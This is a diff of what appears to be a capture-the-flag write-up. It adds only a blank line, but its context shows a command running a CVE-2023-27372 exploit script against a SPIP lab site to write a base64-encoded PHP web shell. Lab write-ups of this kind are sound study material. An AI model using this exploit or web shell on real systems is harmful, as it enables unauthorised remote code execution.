@@ -72,6 +72,7 @@ Use the exploit that found on the github, and procced using this command : ~
 ┌──(root㉿amca)-[/home/amca/CVE-2023-27372]
 └─# python3 CVE-2023-27372.py -u http://publisher.thm/spip/ -c 'echo PD89YCRfR0VUW2NtZF1gPz4= | base64 -d > shell.php'
 ```
+
 > -u SPIP application base URL
 > -c Command to Execute
 
